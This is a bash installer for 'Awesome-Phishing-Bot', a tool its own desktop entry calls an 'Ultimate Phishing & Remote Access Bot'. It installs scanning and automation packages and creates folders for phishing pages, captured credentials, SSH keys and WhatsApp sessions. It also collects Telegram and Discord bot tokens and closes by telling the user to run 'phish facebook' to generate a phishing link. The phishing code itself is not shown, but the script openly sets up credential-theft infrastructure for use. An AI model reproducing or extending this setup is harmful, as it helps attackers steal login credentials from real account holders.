#!/bin/bash
# 🌿 Awesome-Phishing-Bot Installation Script (Linux/macOS)

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Version
VERSION="9.5.1"

echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    🌿 AWESOME-PHISHING-BOT v${VERSION}                          ║${NC}"
echo -e "${GREEN}║                         Installation Script                                    ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        if command -v apt-get &> /dev/null; then
            PKG_MANAGER="apt"
        elif command -v yum &> /dev/null; then
            PKG_MANAGER="yum"
        elif command -v dnf &> /dev/null; then
            PKG_MANAGER="dnf"
        elif command -v pacman &> /dev/null; then
            PKG_MANAGER="pacman"
        else
            PKG_MANAGER="unknown"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        PKG_MANAGER="brew"
    else
        echo -e "${RED}❌ Unsupported OS${NC}"
        exit 1
    fi
    echo -e "${GREEN}✅ Detected OS: ${OS} (${PKG_MANAGER})${NC}"
}

# Install system dependencies
install_system_deps() {
    echo -e "${BLUE}📦 Installing system dependencies...${NC}"
    
    case $PKG_MANAGER in
        apt)
            sudo apt-get update
            sudo apt-get install -y python3 python3-pip python3-dev git \
                build-essential libssl-dev libffi-dev nmap traceroute \
                chromium-browser chromium-chromedriver sqlite3 curl wget
            ;;
        yum|dnf)
            sudo $PKG_MANAGER install -y python3 python3-pip python3-devel git \
                gcc openssl-devel libffi-devel nmap traceroute \
                chromium chromium-headless sqlite curl wget
            ;;
        pacman)
            sudo pacman -S --noconfirm python python-pip git base-devel \
                openssl nmap traceroute chromium sqlite curl wget
            ;;
        brew)
            brew install python3 git openssl nmap traceroute \
                chromium chromedriver sqlite curl wget
            ;;
    esac
    
    echo -e "${GREEN}✅ System dependencies installed${NC}"
}

# Install Python dependencies
install_python_deps() {
    echo -e "${BLUE}🐍 Installing Python dependencies...${NC}"
    
    # Upgrade pip
    pip3 install --upgrade pip
    
    # Install requirements
    if [ -f "requirements.txt" ]; then
        pip3 install -r requirements.txt
    else
        pip3 install requests psutil matplotlib seaborn numpy reportlab \
            Pillow qrcode pyshorteners discord.py telethon slack-sdk \
            paramiko beautifulsoup4 selenium shodan flask cryptography \
            python-dotenv tqdm colorama
    fi
    
    echo -e "${GREEN}✅ Python dependencies installed${NC}"
}

# Create directories
create_directories() {
    echo -e "${BLUE}📁 Creating directories...${NC}"
    
    mkdir -p .awesome_bot
    mkdir -p .awesome_bot/phishing_pages
    mkdir -p .awesome_bot/phishing_templates
    mkdir -p .awesome_bot/phishing_logs
    mkdir -p .awesome_bot/captured_credentials
    mkdir -p awesome_reports
    mkdir -p awesome_reports/graphics
    mkdir -p .awesome_bot/ssh_keys
    mkdir -p .awesome_bot/whatsapp_session
    
    echo -e "${GREEN}✅ Directories created${NC}"
}

# Create virtual environment (optional)
create_venv() {
    read -p "Create Python virtual environment? (y/n): " create_venv_choice
    if [[ $create_venv_choice == "y" || $create_venv_choice == "Y" ]]; then
        echo -e "${BLUE}🔧 Creating virtual environment...${NC}"
        python3 -m venv awesome_bot_venv
        source awesome_bot_venv/bin/activate
        echo -e "${GREEN}✅ Virtual environment created${NC}"
        echo -e "${YELLOW}💡 Activate with: source awesome_bot_venv/bin/activate${NC}"
    fi
}

# Create example config
create_config() {
    if [ ! -f ".awesome_bot/config.json" ]; then
        echo -e "${BLUE}📝 Creating default configuration...${NC}"
        cat > .awesome_bot/config.json << 'EOF'
{
    "version": "9.5.1",
    "first_run": true,
    "auto_start_phishing": false,
    "default_port": 8080,
    "log_level": "INFO",
    "max_credentials_storage": 10000,
    "auto_report": true,
    "report_interval_hours": 24,
    "notification_settings": {
        "telegram": false,
        "discord": false,
        "slack": false,
        "email": false
    }
}
EOF
        echo -e "${GREEN}✅ Configuration created${NC}"
    fi
}

# Setup bot tokens (optional)
setup_tokens() {
    read -p "Setup bot tokens now? (y/n): " setup_tokens_choice
    if [[ $setup_tokens_choice == "y" || $setup_tokens_choice == "Y" ]]; then
        echo -e "${BLUE}🤖 Bot Token Setup${NC}"
        
        read -p "Telegram Bot Token (from @BotFather): " telegram_token
        if [ ! -z "$telegram_token" ]; then
            cat > .awesome_bot/telegram_config.json << EOF
{
    "enabled": true,
    "bot_token": "$telegram_token",
    "api_id": "",
    "api_hash": ""
}
EOF
            echo -e "${GREEN}✅ Telegram configured${NC}"
        fi
        
        read -p "Discord Bot Token: " discord_token
        if [ ! -z "$discord_token" ]; then
            cat > .awesome_bot/discord_config.json << EOF
{
    "enabled": true,
    "token": "$discord_token",
    "prefix": "!"
}
EOF
            echo -e "${GREEN}✅ Discord configured${NC}"
        fi
    fi
}

# Create launcher script
create_launcher() {
    cat > run_awesome_bot.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
if [ -d "awesome_bot_venv" ]; then
    source awesome_bot_venv/bin/activate
fi
python3 awesome_phishing_bot.py "$@"
EOF
    chmod +x run_awesome_bot.sh
    echo -e "${GREEN}✅ Launcher script created: ./run_awesome_bot.sh${NC}"
}

# Create desktop entry (Linux)
create_desktop_entry() {
    if [[ "$OS" == "linux" ]]; then
        cat > ~/.local/share/applications/awesome-bot.desktop << EOF
[Desktop Entry]
Name=Awesome Phishing Bot
Comment=Ultimate Phishing & Remote Access Bot
Exec=$(pwd)/run_awesome_bot.sh
Icon=$(pwd)/.awesome_bot/icon.png
Terminal=true
Type=Application
Categories=Utility;Security;
EOF
        echo -e "${GREEN}✅ Desktop entry created${NC}"
    fi
}

# Main installation
main() {
    detect_os
    install_system_deps
    install_python_deps
    create_directories
    create_venv
    create_config
    setup_tokens
    create_launcher
    create_desktop_entry
    
    echo -e ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                         ✅ INSTALLATION COMPLETE!                            ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e ""
    echo -e "${YELLOW}📝 Next steps:${NC}"
    echo -e "  1. Run the bot: ${GREEN}./run_awesome_bot.sh${NC}"
    echo -e "  2. Or directly: ${GREEN}python3 awesome_phishing_bot.py${NC}"
    echo -e "  3. Type ${GREEN}help${NC} for available commands"
    echo -e "  4. Type ${GREEN}phish facebook${NC} to generate a phishing link"
    echo -e ""
    echo -e "${BLUE}💡 Pro tips:${NC}"
    echo -e "  • Edit .awesome_bot/config.json to change settings"
    echo -e "  • Check .awesome_bot/phishing_logs/ for logs"
    echo -e "  • Reports are saved in awesome_reports/"
    echo -e ""
}

# Run main function
main